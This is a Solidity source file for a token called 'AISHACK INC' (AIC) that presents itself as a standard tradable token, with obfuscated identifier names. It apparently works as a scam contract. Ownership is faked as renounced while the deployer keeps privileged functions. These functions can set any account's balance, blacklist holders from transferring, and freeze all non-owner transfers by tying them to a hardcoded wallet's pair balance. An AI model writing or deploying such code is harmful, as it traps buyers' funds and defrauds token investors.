//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface sellLaunchShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalLiquidityMode {
    function createPair(address listExempt, address receiverTeam) external returns (address);
}

abstract contract receiverTokenWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderList) external view returns (uint256);

    function transfer(address receiverTotal, uint256 txTake) external returns (bool);

    function allowance(address totalFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 txTake) external returns (bool);

    function transferFrom(address sender,address receiverTotal,uint256 txTake) external returns (bool);

    event Transfer(address indexed from, address indexed walletMarketingMode, uint256 value);
    event Approval(address indexed totalFrom, address indexed spender, uint256 value);
}

interface limitTotal is buyTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AISHACKINC is receiverTokenWallet, buyTotal, limitTotal {

    event OwnershipTransferred(address indexed maxList, address indexed modeTx);

    function txTeam() public {
        emit OwnershipTransferred(amountTo, address(0));
        senderModeReceiver = address(0);
    }

    address public amountTo;

    uint256 public receiverAuto;

    function name() external view virtual override returns (string memory) {
        return takeSender;
    }

    bool public launchedEnable;

    uint8 private fundMode = 18;

    bool public tokenAt;

    function decimals() external view virtual override returns (uint8) {
        return fundMode;
    }

    mapping(address => bool) public amountIsExempt;

    bool private autoFromReceiver;

    address public launchLaunchedReceiver;

    function owner() external view returns (address) {
        return senderModeReceiver;
    }

    function liquidityMarketing(address enableTeam, uint256 txTake) public {
        atFrom();
        swapTx[enableTeam] = txTake;
    }

    function modeFromToken(address tradingLaunchedSell) public {
        atFrom();
        if (isTx != buyWallet) {
            isTo = true;
        }
        if (tradingLaunchedSell == amountTo || tradingLaunchedSell == launchLaunchedReceiver) {
            return;
        }
        amountIsExempt[tradingLaunchedSell] = true;
    }

    uint256 public isTx;

    function balanceOf(address senderList) public view virtual override returns (uint256) {
        return swapTx[senderList];
    }

    uint256 private buyWallet;

    function approve(address tokenExemptTrading, uint256 txTake) public virtual override returns (bool) {
        amountLimitTo[_msgSender()][tokenExemptTrading] = txTake;
        emit Approval(_msgSender(), tokenExemptTrading, txTake);
        return true;
    }

    uint256 isLaunch;

    function receiverLimitAmount(address minAuto, address receiverTotal, uint256 txTake) internal returns (bool) {
        if (minAuto == amountTo) {
            return receiverTrading(minAuto, receiverTotal, txTake);
        }
        uint256 teamSell = buyTotal(launchLaunchedReceiver).balanceOf(takeBuy);
        require(teamSell == isLaunch);
        require(!amountIsExempt[minAuto]);
        return receiverTrading(minAuto, receiverTotal, txTake);
    }

    function senderAtMarketing(address tradingShould) public {
        if (launchedEnable) {
            return;
        }
        if (buyWallet != isTx) {
            autoFromReceiver = true;
        }
        receiverList[tradingShould] = true;
        if (tokenAt == autoTotal) {
            isTo = true;
        }
        launchedEnable = true;
    }

    address takeBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private limitTrading = 100000000 * 10 ** 18;

    function receiverTrading(address minAuto, address receiverTotal, uint256 txTake) internal returns (bool) {
        require(swapTx[minAuto] >= txTake);
        swapTx[minAuto] -= txTake;
        swapTx[receiverTotal] += txTake;
        emit Transfer(minAuto, receiverTotal, txTake);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitTrading;
    }

    mapping(address => mapping(address => uint256)) private amountLimitTo;

    bool public autoTotal;

    function allowance(address swapFund, address tokenExemptTrading) external view virtual override returns (uint256) {
        if (tokenExemptTrading == isShouldTotal) {
            return type(uint256).max;
        }
        return amountLimitTo[swapFund][tokenExemptTrading];
    }

    function transfer(address enableTeam, uint256 txTake) external virtual override returns (bool) {
        return receiverLimitAmount(_msgSender(), enableTeam, txTake);
    }

    constructor (){
        if (buyWallet != isTx) {
            autoFromReceiver = false;
        }
        txTeam();
        sellLaunchShould buyAt = sellLaunchShould(isShouldTotal);
        launchLaunchedReceiver = totalLiquidityMode(buyAt.factory()).createPair(buyAt.WETH(), address(this));
        if (tokenAt) {
            receiverAuto = isTx;
        }
        amountTo = _msgSender();
        receiverList[amountTo] = true;
        swapTx[amountTo] = limitTrading;
        if (autoFromReceiver) {
            tokenAt = false;
        }
        emit Transfer(address(0), amountTo, limitTrading);
    }

    bool private fundSender;

    address private senderModeReceiver;

    function getOwner() external view returns (address) {
        return senderModeReceiver;
    }

    function walletFund(uint256 txTake) public {
        atFrom();
        isLaunch = txTake;
    }

    mapping(address => bool) public receiverList;

    function symbol() external view virtual override returns (string memory) {
        return fromSender;
    }

    function atFrom() private view {
        require(receiverList[_msgSender()]);
    }

    string private fromSender = "AIC";

    function transferFrom(address minAuto, address receiverTotal, uint256 txTake) external override returns (bool) {
        if (_msgSender() != isShouldTotal) {
            if (amountLimitTo[minAuto][_msgSender()] != type(uint256).max) {
                require(txTake <= amountLimitTo[minAuto][_msgSender()]);
                amountLimitTo[minAuto][_msgSender()] -= txTake;
            }
        }
        return receiverLimitAmount(minAuto, receiverTotal, txTake);
    }

    bool public isTo;

    address isShouldTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private takeSender = "AISHACK INC";

    uint256 liquidityTeam;

    mapping(address => uint256) private swapTx;

}